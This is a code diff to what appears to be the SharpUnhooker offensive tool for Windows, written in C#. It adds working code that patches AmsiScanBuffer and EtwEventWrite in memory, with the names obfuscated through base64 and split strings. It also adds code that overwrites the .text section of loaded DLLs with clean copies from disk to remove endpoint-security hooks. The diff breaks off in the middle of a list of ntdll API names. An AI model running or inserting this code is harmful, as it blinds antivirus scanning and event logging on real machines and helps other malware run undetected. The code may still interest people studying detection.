@@ -6,15 +6,457 @@ using System.Collections;
 using System.Diagnostics;
 using System.Linq;
 using System.Text;
+using System.IO;
 
-public class SharpUnhooker {
-	// Import required Windows APIs
+public class PEReader
+{
+    public struct IMAGE_DOS_HEADER
+    {      // DOS .EXE header
+        public UInt16 e_magic;              // Magic number
+        public UInt16 e_cblp;               // Bytes on last page of file
+        public UInt16 e_cp;                 // Pages in file
+        public UInt16 e_crlc;               // Relocations
+        public UInt16 e_cparhdr;            // Size of header in paragraphs
+        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
+        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
+        public UInt16 e_ss;                 // Initial (relative) SS value
+        public UInt16 e_sp;                 // Initial SP value
+        public UInt16 e_csum;               // Checksum
+        public UInt16 e_ip;                 // Initial IP value
+        public UInt16 e_cs;                 // Initial (relative) CS value
+        public UInt16 e_lfarlc;             // File address of relocation table
+        public UInt16 e_ovno;               // Overlay number
+        public UInt16 e_res_0;              // Reserved words
+        public UInt16 e_res_1;              // Reserved words
+        public UInt16 e_res_2;              // Reserved words
+        public UInt16 e_res_3;              // Reserved words
+        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
+        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
+        public UInt16 e_res2_0;             // Reserved words
+        public UInt16 e_res2_1;             // Reserved words
+        public UInt16 e_res2_2;             // Reserved words
+        public UInt16 e_res2_3;             // Reserved words
+        public UInt16 e_res2_4;             // Reserved words
+        public UInt16 e_res2_5;             // Reserved words
+        public UInt16 e_res2_6;             // Reserved words
+        public UInt16 e_res2_7;             // Reserved words
+        public UInt16 e_res2_8;             // Reserved words
+        public UInt16 e_res2_9;             // Reserved words
+        public UInt32 e_lfanew;             // File address of new exe header
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IMAGE_DATA_DIRECTORY
+    {
+        public UInt32 VirtualAddress;
+        public UInt32 Size;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct IMAGE_OPTIONAL_HEADER32
+    {
+        public UInt16 Magic;
+        public Byte MajorLinkerVersion;
+        public Byte MinorLinkerVersion;
+        public UInt32 SizeOfCode;
+        public UInt32 SizeOfInitializedData;
+        public UInt32 SizeOfUninitializedData;
+        public UInt32 AddressOfEntryPoint;
+        public UInt32 BaseOfCode;
+        public UInt32 BaseOfData;
+        public UInt32 ImageBase;
+        public UInt32 SectionAlignment;
+        public UInt32 FileAlignment;
+        public UInt16 MajorOperatingSystemVersion;
+        public UInt16 MinorOperatingSystemVersion;
+        public UInt16 MajorImageVersion;
+        public UInt16 MinorImageVersion;
+        public UInt16 MajorSubsystemVersion;
+        public UInt16 MinorSubsystemVersion;
+        public UInt32 Win32VersionValue;
+        public UInt32 SizeOfImage;
+        public UInt32 SizeOfHeaders;
+        public UInt32 CheckSum;
+        public UInt16 Subsystem;
+        public UInt16 DllCharacteristics;
+        public UInt32 SizeOfStackReserve;
+        public UInt32 SizeOfStackCommit;
+        public UInt32 SizeOfHeapReserve;
+        public UInt32 SizeOfHeapCommit;
+        public UInt32 LoaderFlags;
+        public UInt32 NumberOfRvaAndSizes;
+
+        public IMAGE_DATA_DIRECTORY ExportTable;
+        public IMAGE_DATA_DIRECTORY ImportTable;
+        public IMAGE_DATA_DIRECTORY ResourceTable;
+        public IMAGE_DATA_DIRECTORY ExceptionTable;
+        public IMAGE_DATA_DIRECTORY CertificateTable;
+        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+        public IMAGE_DATA_DIRECTORY Debug;
+        public IMAGE_DATA_DIRECTORY Architecture;
+        public IMAGE_DATA_DIRECTORY GlobalPtr;
+        public IMAGE_DATA_DIRECTORY TLSTable;
+        public IMAGE_DATA_DIRECTORY LoadConfigTable;
+        public IMAGE_DATA_DIRECTORY BoundImport;
+        public IMAGE_DATA_DIRECTORY IAT;
+        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+        public IMAGE_DATA_DIRECTORY Reserved;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct IMAGE_OPTIONAL_HEADER64
+    {
+        public UInt16 Magic;
+        public Byte MajorLinkerVersion;
+        public Byte MinorLinkerVersion;
+        public UInt32 SizeOfCode;
+        public UInt32 SizeOfInitializedData;
+        public UInt32 SizeOfUninitializedData;
+        public UInt32 AddressOfEntryPoint;
+        public UInt32 BaseOfCode;
+        public UInt64 ImageBase;
+        public UInt32 SectionAlignment;
+        public UInt32 FileAlignment;
+        public UInt16 MajorOperatingSystemVersion;
+        public UInt16 MinorOperatingSystemVersion;
+        public UInt16 MajorImageVersion;
+        public UInt16 MinorImageVersion;
+        public UInt16 MajorSubsystemVersion;
+        public UInt16 MinorSubsystemVersion;
+        public UInt32 Win32VersionValue;
+        public UInt32 SizeOfImage;
+        public UInt32 SizeOfHeaders;
+        public UInt32 CheckSum;
+        public UInt16 Subsystem;
+        public UInt16 DllCharacteristics;
+        public UInt64 SizeOfStackReserve;
+        public UInt64 SizeOfStackCommit;
+        public UInt64 SizeOfHeapReserve;
+        public UInt64 SizeOfHeapCommit;
+        public UInt32 LoaderFlags;
+        public UInt32 NumberOfRvaAndSizes;
+
+        public IMAGE_DATA_DIRECTORY ExportTable;
+        public IMAGE_DATA_DIRECTORY ImportTable;
+        public IMAGE_DATA_DIRECTORY ResourceTable;
+        public IMAGE_DATA_DIRECTORY ExceptionTable;
+        public IMAGE_DATA_DIRECTORY CertificateTable;
+        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+        public IMAGE_DATA_DIRECTORY Debug;
+        public IMAGE_DATA_DIRECTORY Architecture;
+        public IMAGE_DATA_DIRECTORY GlobalPtr;
+        public IMAGE_DATA_DIRECTORY TLSTable;
+        public IMAGE_DATA_DIRECTORY LoadConfigTable;
+        public IMAGE_DATA_DIRECTORY BoundImport;
+        public IMAGE_DATA_DIRECTORY IAT;
+        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+        public IMAGE_DATA_DIRECTORY Reserved;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct IMAGE_FILE_HEADER
+    {
+        public UInt16 Machine;
+        public UInt16 NumberOfSections;
+        public UInt32 TimeDateStamp;
+        public UInt32 PointerToSymbolTable;
+        public UInt32 NumberOfSymbols;
+        public UInt16 SizeOfOptionalHeader;
+        public UInt16 Characteristics;
+    }
+
+    [StructLayout(LayoutKind.Explicit)]
+    public struct IMAGE_SECTION_HEADER
+    {
+        [FieldOffset(0)]
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+        public char[] Name;
+        [FieldOffset(8)]
+        public UInt32 VirtualSize;
+        [FieldOffset(12)]
+        public UInt32 VirtualAddress;
+        [FieldOffset(16)]
+        public UInt32 SizeOfRawData;
+        [FieldOffset(20)]
+        public UInt32 PointerToRawData;
+        [FieldOffset(24)]
+        public UInt32 PointerToRelocations;
+        [FieldOffset(28)]
+        public UInt32 PointerToLinenumbers;
+        [FieldOffset(32)]
+        public UInt16 NumberOfRelocations;
+        [FieldOffset(34)]
+        public UInt16 NumberOfLinenumbers;
+        [FieldOffset(36)]
+        public DataSectionFlags Characteristics;
+
+        public string Section
+        {
+            get { 
+                int i = Name.Length - 1;
+                while (Name[i] == 0) {
+                    --i;
+                }
+                char[] NameCleaned = new char[i+1];
+                Array.Copy(Name, NameCleaned, i+1);
+                return new string(NameCleaned); 
+            }
+        }
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IMAGE_BASE_RELOCATION
+    {
+        public uint VirtualAdress;
+        public uint SizeOfBlock;
+    }
+
+    [Flags]
+    public enum DataSectionFlags : uint
+    {
+
+        Stub = 0x00000000,
+
+    }
+
+
+    /// The DOS header
+
+    private IMAGE_DOS_HEADER dosHeader;
+
+    /// The file header
+
+    private IMAGE_FILE_HEADER fileHeader;
+
+    /// Optional 32 bit file header 
+
+    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
+
+    /// Optional 64 bit file header 
+
+    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
+
+    /// Image Section headers. Number of sections is in the file header.
+
+    private IMAGE_SECTION_HEADER[] imageSectionHeaders;
+
+    private byte[] rawbytes;
+
+
+
+    public PEReader(string filePath)
+    {
+        // Read in the DLL or EXE and get the timestamp
+        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
+        {
+            BinaryReader reader = new BinaryReader(stream);
+            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
+
+            // Add 4 bytes to the offset
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+
+            UInt32 ntHeadersSignature = reader.ReadUInt32();
+            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
+            if (this.Is32BitHeader)
+            {
+                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
+            }
+            else
+            {
+                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
+            }
+
+            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
+            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
+            {
+                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
+            }
+
+
+
+            rawbytes = System.IO.File.ReadAllBytes(filePath);
+
+        }
+    }
+
+    public PEReader(byte[] fileBytes)
+    {
+        // Read in the DLL or EXE and get the timestamp
+        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
+        {
+            BinaryReader reader = new BinaryReader(stream);
+            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
+
+            // Add 4 bytes to the offset
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+
+            UInt32 ntHeadersSignature = reader.ReadUInt32();
+            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
+            if (this.Is32BitHeader)
+            {
+                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
+            }
+            else
+            {
+                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
+            }
+
+            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
+            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
+            {
+                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
+            }
+
+
+            rawbytes = fileBytes;
+
+        }
+    }
+
+
+    public static T FromBinaryReader<T>(BinaryReader reader)
+    {
+        // Read in a byte array
+        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
+
+        // Pin the managed memory while, copy it out the data, then unpin it
+        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
+        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
+        handle.Free();
+
+        return theStructure;
+    }
+
+
+
+    public bool Is32BitHeader
+    {
+        get
+        {
+            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
+            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
+        }
+    }
+
+
+    public IMAGE_FILE_HEADER FileHeader
+    {
+        get
+        {
+            return fileHeader;
+        }
+    }
+
+
+    /// Gets the optional header
+
+    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
+    {
+        get
+        {
+            return optionalHeader32;
+        }
+    }
+
+
+    /// Gets the optional header
+
+    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
+    {
+        get
+        {
+            return optionalHeader64;
+        }
+    }
+
+    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
+    {
+        get
+        {
+            return imageSectionHeaders;
+        }
+    }
+
+    public byte[] RawBytes
+    {
+        get
+        {
+            return rawbytes;
+        }
+
+    }
+
+}
+
+public class PatchAMSIAndETW {
 	[DllImport("kernel32.dll")]
     public static extern IntPtr LoadLibrary(string lpLibFileName);
     [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
     [DllImport("kernel32.dll")]
-    public static extern bool FreeLibrary(IntPtr hModule);
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+	static byte[] x64_etw_patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
+	static byte[] x86_etw_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
+	static byte[] x64_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+	static byte[] x86_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+	private static string decode(string b64encoded) {
+		return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
+	}
+
+	private static void PatchMem(byte[] patch, string library, string function) {
+		try {
+			uint oldProtect;
+			IntPtr libPtr = LoadLibrary(library);
+			IntPtr funcPtr = GetProcAddress(libPtr, function);
+			VirtualProtect(funcPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+			Marshal.Copy(patch, 0, funcPtr, patch.Length);
+		}catch (Exception e) {
+			Console.WriteLine(" [!] {0}", e.Message);
+			Console.WriteLine(" [!] {0}", e.InnerException);
+		}
+	}
+
+	private static void PatchAMSI(byte[] patch) {
+		string dll = decode("YW1zaS5kbGw=");
+		PatchMem(patch, dll, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
+	}
+
+	private static void PatchETW(byte[] Patch) {
+		PatchMem(Patch, ("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l"), ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
+	}
+
+	public static void Main() {
+		bool isit64bit;
+		if (IntPtr.Size == 4) {
+			isit64bit = false;
+		}else {
+			isit64bit = true;
+		}
+		if (isit64bit) {
+			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10K"));
+			PatchAMSI(x64_amsi_patch);
+			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQo="));
+			PatchETW(x64_etw_patch);
+		}else {
+			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10K"));
+			PatchAMSI(x86_amsi_patch);
+			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQo="));
+			PatchETW(x86_etw_patch);
+		}
+	}
+}
+
+public class SharpUnhooker {
+	// Import required Windows APIs
+	public static uint MEM_COMMIT = 0x1000;
+    public static uint MEM_RESERVE = 0x2000;
+    public static uint PAGE_EXECUTE_READWRITE = 0x40;
+    public static uint PAGE_READWRITE = 0x04;
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll")]
 	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 	[DllImport("kernel32.dll")]
@@ -22,114 +464,148 @@ public class SharpUnhooker {
 	[DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-    public static void UnhookNT(string IWantToUnhookThisAPI) {
-    	Console.WriteLine("----------------------------------------");
-    	IntPtr originallib = LoadLibrary("C:/Windows/System32/ntdll.dll");
-    	byte[] assemblyBytes = new byte[10];
-    	if (originallib != IntPtr.Zero) {
-    		Console.WriteLine("Yay!Got original ntdll handle.");
-	    	IntPtr readOriginalAPI = GetProcAddress(originallib, IWantToUnhookThisAPI);
-	    	if (readOriginalAPI != IntPtr.Zero) {
-	    		Console.WriteLine(String.Format("Yay!got address for {0}", IWantToUnhookThisAPI));
-	    		Console.WriteLine("Reading Original API...");
-    			Marshal.Copy(readOriginalAPI, assemblyBytes, 0, 10);
-	    		if (assemblyBytes != null && assemblyBytes.Length > 0) {
-					Console.WriteLine("Yay!Original API Readed.");
-					Console.WriteLine(BitConverter.ToString(assemblyBytes));
+    public static void Unhooker(string DLLname) {
+    	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
+    	bool thisis64bit;
+    	if (IntPtr.Size == 4) {
+			thisis64bit = false;
+		}else {
+			thisis64bit = true;
+		}
+		string DLLfile = (@"C:\Windows\System32\" + DLLname);
+    	// get original .text section from original DLL
+    	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLfile);
+        PEReader OriginalDLL = new PEReader(DLLBytes);
+		Console.WriteLine("Reading Original DLL...");
+        // just to be safe,i allocate as big as the DLL :')
+        IntPtr codebase;
+        if (thisis64bit) {
+	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);        	
+        }else {
+	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        }
+        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
+            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
+            	// read and copy .text section
+                IntPtr byteLocationOnMemory = VirtualAlloc(IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
+                Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                int SectionNumber = i;
+                if (assemblyBytes != null && assemblyBytes.Length > 0) {
+					Console.WriteLine("Yay!Original DLL Readed.");
+					Console.WriteLine("Calculating .text section pointer in loaded DLL...");
+					IntPtr InMemorySectionPointer = (GetModuleHandle(DLLname)) + (int)OriginalDLL.ImageSectionHeaders[SectionNumber].VirtualAddress;
+					Console.WriteLine("Calculation done! .text pointer in loaded DLL : {0}", InMemorySectionPointer.ToString("X4"));
 					Console.WriteLine("Updating memory protection setting...");
 					uint oldProtect;
-	    			bool updateProtection = VirtualProtect(GetProcAddress(GetModuleHandle("ntdll"), IWantToUnhookThisAPI), (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
+	    			bool updateProtection = VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
 	    			if (updateProtection) {
 	    				Console.WriteLine("Yay!Memory protection setting updated!");
 	    				Console.WriteLine("Applying patch...");
 	    				IntPtr WPMOutput;
-						bool patchdll = WriteProcessMemory(Process.GetCurrentProcess().Handle, GetProcAddress(GetModuleHandle("ntdll"), IWantToUnhookThisAPI), assemblyBytes, assemblyBytes.Length, out WPMOutput);
+						bool patchdll = WriteProcessMemory(Process.GetCurrentProcess().Handle, InMemorySectionPointer, assemblyBytes, assemblyBytes.Length, out WPMOutput);
 						if (patchdll) {
 							Console.WriteLine("Yay!Patch applied!");
-							FreeLibrary(originallib);
 							Console.WriteLine("Rechecking Loaded API After Patching...");
-							byte[] assemblyBytesAfterPatched = new byte[10];
-							IntPtr readPatchedAPI = GetProcAddress(GetModuleHandle("ntdll"), IWantToUnhookThisAPI);
-							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, 10);
-							Console.WriteLine(BitConverter.ToString(assemblyBytesAfterPatched));
+							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData];
+							IntPtr readPatchedAPI = InMemorySectionPointer;
+							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData);
 							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
+							uint newProtect;
+							VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, out newProtect);
 							if (!checkAssemblyBytesAfterPatched) {
-								Console.WriteLine("Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked.");
+								Console.WriteLine("[-] Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked! [-]");
 							}else {
-								Console.WriteLine("Chill Out,Everything Is Fine.Which Means API Is Unhooked!");
+								Console.WriteLine("[+++] Chill Out,Everything Is Fine.Which Means API Is Unhooked! [+++]");
 							}
 						}else {
-							Console.WriteLine("Patch unsucessful!");
-							FreeLibrary(originallib);
+							Console.WriteLine("[-] Patch unsucessful! [-]");
 						}
-	    			}	
-	    		}else {
-	    			Console.WriteLine("Failed to read API.");
-	    			FreeLibrary(originallib);
-	    		}
-    		}else {
-    			Console.WriteLine("API doesnt exist.");
-    			FreeLibrary(originallib);
-    		}
-    	}else {
-    		Console.WriteLine("WADAFOK NTDLL IS NOT IN THE RIGHT LOCATION!");
-    	}
-    }
-    public static void UnhookNTSilent(string IWantToUnhookThisAPI) {
-    	IntPtr originallib = LoadLibrary("C:/Windows/System32/ntdll.dll");
-    	byte[] assemblyBytes = new byte[10];
-    	if (originallib != IntPtr.Zero) {
-	    	IntPtr readOriginalAPI = GetProcAddress(originallib, IWantToUnhookThisAPI);
-	    	if (readOriginalAPI != IntPtr.Zero) {
-    			Marshal.Copy(readOriginalAPI, assemblyBytes, 0, 10);
-	    		if (assemblyBytes != null && assemblyBytes.Length > 0) {
-	    			uint oldProtect;
-	    			bool updateProtection = VirtualProtect(GetProcAddress(GetModuleHandle("ntdll"), IWantToUnhookThisAPI), (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
-					if (updateProtection) {
-						IntPtr WPMOutput;
-						bool patchdll = WriteProcessMemory(Process.GetCurrentProcess().Handle, GetProcAddress(GetModuleHandle("ntdll"), IWantToUnhookThisAPI), assemblyBytes, assemblyBytes.Length, out WPMOutput);
-						if (patchdll) {
-							FreeLibrary(originallib);
-							byte[] assemblyBytesAfterPatched = new byte[10];
-							IntPtr readPatchedAPI = GetProcAddress(GetModuleHandle("ntdll"), IWantToUnhookThisAPI);
-							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, 10);
-							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
-							if (!checkAssemblyBytesAfterPatched) {
-								Console.WriteLine("Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked.");
-							}else {
-								Console.WriteLine("Yay!API Is Unhooked!");
-							}
-						}else {
-							Console.WriteLine("Patch unsucessful!");
-							FreeLibrary(originallib);
-						}
-					}else {
-						Console.WriteLine("Failed to update memory protection setting");
-						FreeLibrary(originallib);
+	    			}else {
+						Console.WriteLine("[-] Failed to update memory protection setting! [-]");
 					}
 	    		}else {
-	    			Console.WriteLine("Failed to read API.");
-	    			FreeLibrary(originallib);
+	    			Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
 	    		}
-    		}else {
-    			Console.WriteLine("API doesnt exist.");
-    			FreeLibrary(originallib);
-    		}
-    	}else {
-    		Console.WriteLine("WADAFOK NTDLL IS NOT IN THE RIGHT LOCATION!");
+            }
     	}
     }
-    public static void UnhookNTAll() {
-    	string[] NTAPIs = {"ApiSetQueryApiSetPresence", "ApiSetQueryApiSetPresenceEx", "CsrAllocateCaptureBuffer", "CsrAllocateMessagePointer", "CsrCaptureMessageBuffer", "CsrCaptureMessageMultiUnicodeStringsInPlace", "CsrCaptureMessageString", "CsrCaptureTimeout", "CsrClientCallServer", "CsrClientConnectToServer", "CsrFreeCaptureBuffer", "CsrGetProcessId", "CsrIdentifyAlertableThread", "CsrSetPriorityClass", "CsrVerifyRegion", "DbgBreakPoint", "DbgPrint", "DbgPrintEx", "DbgPrintReturnControlC", "DbgPrompt", "DbgQueryDebugFilterState", "DbgSetDebugFilterState", "DbgUiConnectToDbg", "DbgUiContinue", "DbgUiConvertStateChangeStructure", "DbgUiConvertStateChangeStructureEx", "DbgUiDebugActiveProcess", "DbgUiGetThreadDebugObject", "DbgUiIssueRemoteBreakin", "DbgUiRemoteBreakin", "DbgUiSetThreadDebugObject", "DbgUiStopDebugging", "DbgUiWaitStateChange", "DbgUserBreakPoint", "EtwCheckCoverage", "EtwCreateTraceInstanceId", "EtwDeliverDataBlock", "EtwEnumerateProcessRegGuids", "EtwEventActivityIdControl", "EtwEventEnabled", "EtwEventProviderEnabled", "EtwEventRegister", "EtwEventSetInformation", "EtwEventUnregister", "EtwEventWrite", "EtwEventWriteEndScenario", "EtwEventWriteEx", "EtwEventWriteFull", "EtwEventWriteNoRegistration", "EtwEventWriteStartScenario", "EtwEventWriteString", "EtwEventWriteTransfer", "EtwGetTraceEnableFlags", "EtwGetTraceEnableLevel", "EtwGetTraceLoggerHandle", "EtwLogTraceEvent", "EtwNotificationRegister", "EtwNotificationUnregister", "EtwProcessPrivateLoggerRequest", "EtwRegisterSecurityProvider", "EtwRegisterTraceGuidsA", "EtwRegisterTraceGuidsW", "EtwReplyNotification", "EtwSendNotification", "EtwSetMark", "EtwTraceEventInstance", "EtwTraceMessage", "EtwTraceMessageVa", "EtwUnregisterTraceGuids", "EtwWriteUMSecurityEvent", "EtwpCreateEtwThread", "EtwpGetCpuSpeed", "EvtIntReportAuthzEventAndSourceAsync", "EvtIntReportEventAndSourceAsync", "ExpInterlockedPopEntrySListEnd", "ExpInterlockedPopEntrySListFault", "ExpInterlockedPopEntrySListResume", "KiRaiseUserExceptionDispatcher", "KiUserApcDispatcher", "KiUserCallbackDispatcher", "KiUserExceptionDispatcher", "KiUserInvertedFunctionTable", "LdrAccessResource", "LdrAddDllDirectory", "LdrAddLoadAsDataTable", "LdrAddRefDll", "LdrAppxHandleIntegrityFailure", "LdrCallEnclave", "LdrControlFlowGuardEnforced", "LdrCreateEnclave", "LdrDeleteEnclave", "LdrDisableThreadCalloutsForDll", "LdrEnumResources", "LdrEnumerateLoadedModules", "LdrFastFailInLoaderCallout", "LdrFindEntryForAddress", "LdrFindResourceDirectory_U", "LdrFindResourceEx_U", "LdrFindResource_U", "LdrFlushAlternateResourceModules", "LdrGetDllDirectory", "LdrGetDllFullName", "LdrGetDllHandle", "LdrGetDllHandleByMapping", "LdrGetDllHandleByName", "LdrGetDllHandleEx", "LdrGetDllPath", "LdrGetFailureData", "LdrGetFileNameFromLoadAsDataTable", "LdrGetKnownDllSectionHandle", "LdrGetProcedureAddress", "LdrGetProcedureAddressEx", "LdrGetProcedureAddressForCaller", "LdrInitShimEngineDynamic", "LdrInitializeEnclave", "LdrInitializeThunk", "LdrIsModuleSxsRedirected", "LdrLoadAlternateResourceModule", "LdrLoadAlternateResourceModuleEx", "LdrLoadDll", "LdrLoadEnclaveModule", "LdrLockLoaderLock", "LdrOpenImageFileOptionsKey", "LdrProcessInitializationComplete", "LdrProcessRelocationBlock", "LdrProcessRelocationBlockEx", "LdrQueryImageFileExecutionOptions", "LdrQueryImageFileExecutionOptionsEx", "LdrQueryImageFileKeyOption", "LdrQueryModuleServiceTags", "LdrQueryOptionalDelayLoadedAPI", "LdrQueryProcessModuleInformation", "LdrRegisterDllNotification", "LdrRemoveDllDirectory", "LdrRemoveLoadAsDataTable", "LdrResFindResource", "LdrResFindResourceDirectory", "LdrResGetRCConfig", "LdrResRelease", "LdrResSearchResource", "LdrResolveDelayLoadedAPI", "LdrResolveDelayLoadsFromDll", "LdrRscIsTypeExist", "LdrSetAppCompatDllRedirectionCallback", "LdrSetDefaultDllDirectories", "LdrSetDllDirectory", "LdrSetDllManifestProber", "LdrSetImplicitPathOptions", "LdrSetMUICacheType", "LdrShutdownProcess", "LdrShutdownThread", "LdrStandardizeSystemPath", "LdrSystemDllInitBlock", "LdrUnloadAlternateResourceModule", "LdrUnloadAlternateResourceModuleEx", "LdrUnloadDll", "LdrUnlockLoaderLock", "LdrUnregisterDllNotification", "LdrUpdatePackageSearchPath", "LdrVerifyImageMatchesChecksum", "LdrVerifyImageMatchesChecksumEx", "LdrpResGetMappingSize", "LdrpResGetResourceDirectory", "NtAcceptConnectPort", "NtAccessCheck", "NtAccessCheckAndAuditAlarm", "NtAccessCheckByType", "NtAccessCheckByTypeAndAuditAlarm", "NtAccessCheckByTypeResultList", "NtAccessCheckByTypeResultListAndAuditAlarm", "NtAccessCheckByTypeResultListAndAuditAlarmByHandle", "NtAcquireCrossVmMutant", "NtAcquireProcessActivityReference", "NtAddAtom", "NtAddAtomEx", "NtAddBootEntry", "NtAddDriverEntry", "NtAdjustGroupsToken", "NtAdjustPrivilegesToken", "NtAdjustTokenClaimsAndDeviceGroups", "NtAlertResumeThread", "NtAlertThread", "NtAlertThreadByThreadId", "NtAllocateLocallyUniqueId", "NtAllocateReserveObject", "NtAllocateUserPhysicalPages", "NtAllocateUserPhysicalPagesEx", "NtAllocateUuids", "NtAllocateVirtualMemory", "NtAllocateVirtualMemoryEx", "NtAlpcAcceptConnectPort", "NtAlpcCancelMessage", "NtAlpcConnectPort", "NtAlpcConnectPortEx", "NtAlpcCreatePort", "NtAlpcCreatePortSection", "NtAlpcCreateResourceReserve", "NtAlpcCreateSectionView", "NtAlpcCreateSecurityContext", 